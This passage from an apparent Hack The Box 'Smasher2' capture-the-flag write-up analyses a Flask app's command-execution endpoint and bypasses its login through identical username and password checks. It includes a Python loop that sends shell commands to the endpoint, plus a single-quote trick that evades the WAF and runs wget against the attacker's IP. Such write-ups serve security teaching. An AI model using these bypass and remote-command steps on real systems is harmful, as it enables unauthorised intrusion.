100%[&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;]  18.17K  85.2KB&#x2F;s    in 0.2s    </span><br><span class="line"></span><br><span class="line">2019-12-13 07:40:44 (85.2 KB&#x2F;s) - ‘ses.so’ saved [18608&#x2F;18608]</span><br><span class="line"></span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;smasher2&#x2F;backup#</span><br></pre></td></tr></table></figure>
<p>By looking at <code>auth.py</code> I knew that these files were related to <code>wonderfulsessionmanager.smasher2.htb</code>.</p>
<h2 id="auth-py-Analysis"><a href="#auth-py-Analysis" class="headerlink" title="auth.py: Analysis"></a>auth.py: Analysis</h2><p><code>auth.py</code>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> ses</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> session,redirect, url_for, request,render_template, jsonify,Flask, send_from_directory</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Lock</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_secure_key</span><span class="params">()</span>:</span></span><br><span class="line">    m = hashlib.sha1()</span><br><span class="line">    m.update(os.urandom(<span class="number">32</span>))</span><br><span class="line">    <span class="keyword">return</span> m.hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">craft_secure_token</span><span class="params">(content)</span>:</span></span><br><span class="line">    h = hmac.new(<span class="string">"HMACSecureKey123!"</span>, base64.b64encode(content).encode(), hashlib.sha256)</span><br><span class="line">    <span class="keyword">return</span> h.hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">lock = Lock()</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = get_secure_key()</span><br><span class="line">Managers = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">log_creds</span><span class="params">(ip, c)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"creds.log"</span>, <span class="string">"a"</span>) <span class="keyword">as</span> creds:</span><br><span class="line">        creds.write(<span class="string">"Login from &#123;&#125; with data &#123;&#125;:&#123;&#125;\n"</span>.format(ip, c[<span class="string">"username"</span>], c[<span class="string">"password"</span>]))</span><br><span class="line">        creds.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">safe_get_manager</span><span class="params">(id)</span>:</span></span><br><span class="line">    lock.acquire()</span><br><span class="line">    manager = Managers[id]</span><br><span class="line">    lock.release()</span><br><span class="line">    <span class="keyword">return</span> manager</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">safe_init_manager</span><span class="params">(id)</span>:</span></span><br><span class="line">    lock.acquire()</span><br><span class="line">    <span class="keyword">if</span> id <span class="keyword">in</span> Managers:</span><br><span class="line">        <span class="keyword">del</span> Managers[id]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">            login = [<span class="string">"&lt;REDACTED&gt;"</span>, <span class="string">"&lt;REDACTED&gt;"</span>]</span><br><span class="line">            Managers.update(&#123;id: ses.SessionManager(login, craft_secure_token(<span class="string">":"</span>.join(login)))&#125;)</span><br><span class="line">    lock.release()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">safe_have_manager</span><span class="params">(id)</span>:</span></span><br><span class="line">    ret = <span class="literal">False</span></span><br><span class="line">    lock.acquire()</span><br><span class="line">    ret = id <span class="keyword">in</span> Managers</span><br><span class="line">    lock.release()</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.before_request</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">before_request</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.path == <span class="string">"/"</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> session.has_key(<span class="string">"id"</span>):</span><br><span class="line">            k = get_secure_key()</span><br><span class="line">            safe_init_manager(k)</span><br><span class="line">            session[<span class="string">"id"</span>] = k</span><br><span class="line">        <span class="keyword">elif</span> session.has_key(<span class="string">"id"</span>) <span class="keyword">and</span> <span class="keyword">not</span> safe_have_manager(session[<span class="string">"id"</span>]):</span><br><span class="line">            <span class="keyword">del</span> session[<span class="string">"id"</span>]</span><br><span class="line">            <span class="keyword">return</span> redirect(<span class="string">"/"</span>, <span class="number">302</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> session.has_key(<span class="string">"id"</span>) <span class="keyword">and</span> safe_have_manager(session[<span class="string">"id"</span>]):</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> redirect(<span class="string">"/"</span>, <span class="number">302</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.after_request</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">after_request</span><span class="params">(resp)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/assets/&lt;path:filename&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">base_static</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> send_from_directory(app.root_path + <span class="string">'/assets/'</span>, filename)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"index.html"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view_login</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"login.html"</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/auth', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    ret = &#123;<span class="string">"authenticated"</span>: <span class="literal">None</span>, <span class="string">"result"</span>: <span class="literal">None</span>&#125;</span><br><span class="line">    manager = safe_get_manager(session[<span class="string">"id"</span>])</span><br><span class="line">    data = request.get_json(silent=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            tmp_login = dict(data[<span class="string">"data"</span>])</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        tmp_user_login = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            is_logged = manager.check_login(data)</span><br><span class="line">            secret_token_info = [<span class="string">"/api/&lt;api_key&gt;/job"</span>, manager.secret_key, int(time.time())]</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                tmp_user_login = &#123;<span class="string">"username"</span>: tmp_login[<span class="string">"username"</span>], <span class="string">"password"</span>: tmp_login[<span class="string">"password"</span>]&#125;</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> is_logged[<span class="number">0</span>]:</span><br><span class="line">                ret[<span class="string">"authenticated"</span>] = <span class="literal">False</span></span><br><span class="line">                ret[<span class="string">"result"</span>] = <span class="string">"Cannot authenticate with data: %s - %s"</span> % (is_logged[<span class="number">1</span>], <span class="string">"Too many tentatives, wait 2 minutes!"</span> <span class="keyword">if</span> manager.blocked <span class="keyword">else</span> <span class="string">"Try again!"</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> tmp_user_login <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                    log_creds(request.remote_addr, tmp_user_login)</span><br><span class="line">                ret[<span class="string">"authenticated"</span>] = <span class="literal">True</span></span><br><span class="line">                ret[<span class="string">"result"</span>] = &#123;<span class="string">"endpoint"</span>: secret_token_info[<span class="number">0</span>], <span class="string">"key"</span>: secret_token_info[<span class="number">1</span>], <span class="string">"creation_date"</span>: secret_token_info[<span class="number">2</span>]&#125;</span><br><span class="line">        <span class="keyword">except</span> TypeError <span class="keyword">as</span> e:</span><br><span class="line">            ret[<span class="string">"authenticated"</span>] = <span class="literal">False</span></span><br><span class="line">            ret[<span class="string">"result"</span>] = str(e)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ret[<span class="string">"authenticated"</span>] = <span class="literal">False</span></span><br><span class="line">        ret[<span class="string">"result"</span>] = <span class="string">"Cannot authenticate missing parameters."</span></span><br><span class="line">    <span class="keyword">return</span> jsonify(ret)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/api/&lt;key&gt;/job", methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">job</span><span class="params">(key)</span>:</span></span><br><span class="line">    ret = &#123;<span class="string">"success"</span>: <span class="literal">None</span>, <span class="string">"result"</span>: <span class="literal">None</span>&#125;</span><br><span class="line">    manager = safe_get_manager(session[<span class="string">"id"</span>])</span><br><span class="line">    <span class="keyword">if</span> manager.secret_key == key:</span><br><span class="line">        data = request.get_json(silent=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">if</span> data <span class="keyword">and</span> type(data) == dict:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"schedule"</span> <span class="keyword">in</span> data:</span><br><span class="line">                out = subprocess.check_output([<span class="string">'bash'</span>, <span class="string">'-c'</span>, data[<span class="string">"schedule"</span>]])</span><br><span class="line">                ret[<span class="string">"success"</span>] = <span class="literal">True</span></span><br><span class="line">                ret[<span class="string">"result"</span>] = out</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                ret[<span class="string">"success"</span>] = <span class="literal">False</span></span><br><span class="line">                ret[<span class="string">"result"</span>] = <span class="string">"Missing schedule parameter."</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ret[<span class="string">"success"</span>] = <span class="literal">False</span></span><br><span class="line">            ret[<span class="string">"result"</span>] = <span class="string">"Invalid value provided."</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ret[<span class="string">"success"</span>] = <span class="literal">False</span></span><br><span class="line">        ret[<span class="string">"result"</span>] = <span class="string">"Invalid token."</span></span><br><span class="line">    <span class="keyword">return</span> jsonify(ret)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">'127.0.0.1'</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>
<p>I read the code and these are the things that interest us:<br>After successful authentication the server will respond with a secret key that we can use to access the endpoint <code>/api/&lt;key&gt;/job</code>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ret[<span class="string">"authenticated"</span>] = <span class="literal">True</span></span><br><span class="line">ret[<span class="string">"result"</span>] = &#123;<span class="string">"endpoint"</span>: secret_token_info[<span class="number">0</span>], <span class="string">"key"</span>: secret_token_info[<span class="number">1</span>], <span class="string">"creation_date"</span>: secret_token_info[<span class="number">2</span>]&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secret_token_info = [<span class="string">"/api/&lt;api_key&gt;/job"</span>, manager.secret_key, int(time.time())]</span><br></pre></td></tr></table></figure>
<p>That endpoint only accepts <code>POST</code> requests:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route("/api/&lt;key&gt;/job", methods=['POST'])</span></span><br></pre></td></tr></table></figure>
<p>And the sent data has to be <code>json</code>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data = request.get_json(silent=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">if</span> data <span class="keyword">and</span> type(data) == dict:</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<p>Through that endpoint we can execute system commands by providing them in a parameter called <code>schedule</code>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">"schedule"</span> <span class="keyword">in</span> data:</span><br><span class="line">    out = subprocess.check_output([<span class="string">'bash'</span>, <span class="string">'-c'</span>, data[<span class="string">"schedule"</span>]])</span><br><span class="line">    ret[<span class="string">"success"</span>] = <span class="literal">True</span></span><br><span class="line">    ret[<span class="string">"result"</span>] = out</span><br></pre></td></tr></table></figure>


<h2 id="session-so-Analysis-–-gt-Authentication-Bypass"><a href="#session-so-Analysis-–-gt-Authentication-Bypass" class="headerlink" title="session.so: Analysis –&gt; Authentication Bypass"></a>session.so: Analysis –&gt; Authentication Bypass</h2><p><code>session.so</code> is a compiled shared python library, <code>so</code> stands for shared object:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;smasher2&#x2F;backup# file ses.so </span><br><span class="line">ses.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]&#x3D;0c67d40b77854318b10417b4aedfee95a52f0550, not stripped</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;smasher2&#x2F;backup#</span><br></pre></td></tr></table></figure>
<p>I opened it in <code>ghidra</code> and started checking the functions. Two functions caught my attention, <code>get_internal_pwd()</code> and <code>get_internal_usr()</code>:<br><img src="/images/hackthebox/smasher2/7.png" alt=""><br>I looked at the decompiled code of both of them and noticed something strange, they were the exact same:<br><code>get_internal_pwd()</code>:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">undefined8 <span class="title">get_internal_pwd</span><span class="params">(undefined8 param_1)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">long</span> *plVar1;</span><br><span class="line">  undefined8 uVar2;</span><br><span class="line">  </span><br><span class="line">  plVar1 = (<span class="keyword">long</span> *)PyObject_GetAttrString(param_1,<span class="string">"user_login"</span>);</span><br><span class="line">  uVar2 = PyList_GetItem(plVar1,<span class="number">0</span>);</span><br><span class="line">  uVar2 = PyString_AsString(uVar2);</span><br><span class="line">  *plVar1 = *plVar1 + <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span> (*plVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">    (**(code **)(plVar1[<span class="number">1</span>] + <span class="number">0x30</span>))(plVar1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> uVar2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>get_internal_usr()</code>:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">undefined8 <span class="title">get_internal_usr</span><span class="params">(undefined8 param_1)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">long</span> *plVar1;</span><br><span class="line">  undefined8 uVar2;</span><br><span class="line">  </span><br><span class="line">  plVar1 = (<span class="keyword">long</span> *)PyObject_GetAttrString(param_1,<span class="string">"user_login"</span>);</span><br><span class="line">  uVar2 = PyList_GetItem(plVar1,<span class="number">0</span>);</span><br><span class="line">  uVar2 = PyString_AsString(uVar2);</span><br><span class="line">  *plVar1 = *plVar1 + <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span> (*plVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">    (**(code **)(plVar1[<span class="number">1</span>] + <span class="number">0x30</span>))(plVar1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> uVar2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/HTB/boxes/smasher2/backup<span class="meta"># diff getinternalusr getinternalpwd </span></span><br><span class="line"><span class="number">1</span>c1</span><br><span class="line">&lt; <span class="function">undefined8 <span class="title">get_internal_usr</span><span class="params">(undefined8 param_1)</span></span></span><br><span class="line">---</span><br><span class="line">&gt; <span class="function">undefined8 <span class="title">get_internal_pwd</span><span class="params">(undefined8 param_1)</span></span></span><br><span class="line">root@kali:~/Desktop/HTB/boxes/smasher2/backup#</span><br></pre></td></tr></table></figure>
<p>So in theory, since the two function are identical, providing the username as a password should work. Which means that it’s just a matter of finding an existing username and we’ll be able to bypass the authentication.<br>I tried some common usernames before attempting to use <code>wfuzz</code>, <code>Administrator</code> worked:<br><img src="/images/hackthebox/smasher2/8.png" alt=""></p>
<p><img src="/images/hackthebox/smasher2/9.png" alt=""></p>
<h2 id="WAF-Bypass-–-gt-RCE-–-gt-Shell-as-dzonerzy-–-gt-Root-Flag"><a href="#WAF-Bypass-–-gt-RCE-–-gt-Shell-as-dzonerzy-–-gt-Root-Flag" class="headerlink" title="WAF Bypass –&gt; RCE –&gt; Shell as dzonerzy –&gt; Root Flag"></a>WAF Bypass –&gt; RCE –&gt; Shell as dzonerzy –&gt; Root Flag</h2><p>I wrote a small script to execute commands through <code>/api/&lt;key&gt;/job</code> as we saw earlier in <code>auth.py</code>, the script was meant for testing purposes:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> post</span><br><span class="line"></span><br><span class="line">cookies = &#123;<span class="string">"session"</span>:<span class="string">"eyJpZCI6eyIgYiI6Ik16UXpNakpoTVRVeVlqaGlNekJsWVdSbU9HTXlPV1kzTmprMk1XSTROV00xWkdVME5HTmxNQT09In19.XfNxUQ.MznJKgs2isklCZxfV4G0IjEPcvg"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	cmd = input(<span class="string">"cmd: "</span>)</span><br><span class="line">	req = post(<span class="string">"http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job"</span>, json=&#123;<span class="string">"schedule"</span>:cmd&#125;, cookies=cookies)</span><br><span class="line">	response = req.text</span><br><span class="line">	print(response)</span><br></pre></td></tr></table></figure>
<p>Testing with <code>whoami</code> worked just fine:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;smasher2# .&#x2F;test.py </span><br><span class="line">cmd: whoami</span><br><span class="line">&#123;&quot;result&quot;:&quot;dzonerzy\n&quot;,&quot;success&quot;:true&#125;</span><br><span class="line"></span><br><span class="line">cmd:</span><br></pre></td></tr></table></figure>
<p>However when I tried other commands I got a <code>403</code> response indicating that the server was protected by a <code>WAF</code>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">cmd: curl http:&#x2F;&#x2F;10.10.xx.xx</span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC &quot;-&#x2F;&#x2F;IETF&#x2F;&#x2F;DTD HTML 2.0&#x2F;&#x2F;EN&quot;&gt;</span><br><span class="line">&lt;html&gt;&lt;head&gt;</span><br><span class="line">&lt;title&gt;403 Forbidden&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Forbidden&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;p&gt;You don&#39;t have permission to access &#x2F;api&#x2F;fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8&#x2F;job</span><br><span class="line">on this server.&lt;br &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;p&gt;</span><br><span class="line"></span><br><span class="line">&lt;address&gt;Apache&#x2F;2.4.29 (Ubuntu) Server at wonderfulsessionmanager.smasher2.htb Port 80&lt;&#x2F;address&gt;</span><br><span class="line">&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;</span><br><span class="line"></span><br><span class="line">cmd:</span><br></pre></td></tr></table></figure>
<p>I could easily bypass it by inserting single quotes in the command:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cmd: &#39;w&#39;g&#39;e&#39;t &#39;h&#39;t&#39;t&#39;p&#39;:&#39;&#x2F;&#39;&#x2F;&#39;1&#39;0&#39;.&#39;1&#39;0&#39;.&#39;x&#39;x&#39;.&#39;x&#39;x&#39;&#x2F;&#39;t&#39;e&#39;s&#39;t&#39;</span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC &quot;-&#x2F;&#x2F;W3C&#x2F;&#x2F;DTD HTML 3.2 Final&#x2F;&#x2F;EN&quot;&gt;</span><br><span class="line">&lt;title&gt;500 Internal Server Error&lt;&#x2F;title&gt;</span><br><span class="line">&lt;h1&gt;Internal Server Error&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;p&gt;The server encountered an internal error and was unable to complete your request.  Either the server is overloaded or there is an error in the application.&lt;&#x2F;p&gt;</span><br><span class="line"></span><br><span class="line">cmd:</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Serving HTTP on 0.0.0.0 port 80 ...</span><br><span class="line">10.10.10.135 - - [13&#x2F;Dec&#x2F;2019 08:18:33] code 404, message File not found</span><br><span class="line">10.10.10.135 - - [13&#x2F;Dec&#x2F;2019 08:18:33] &quot;GET &#x2F;test HTTP&#x2F;1.1&quot; 404 -</span><br></pre></td></tr></table></figure>
<p>To automate the exploitation process I wrote this small exploit:</p>
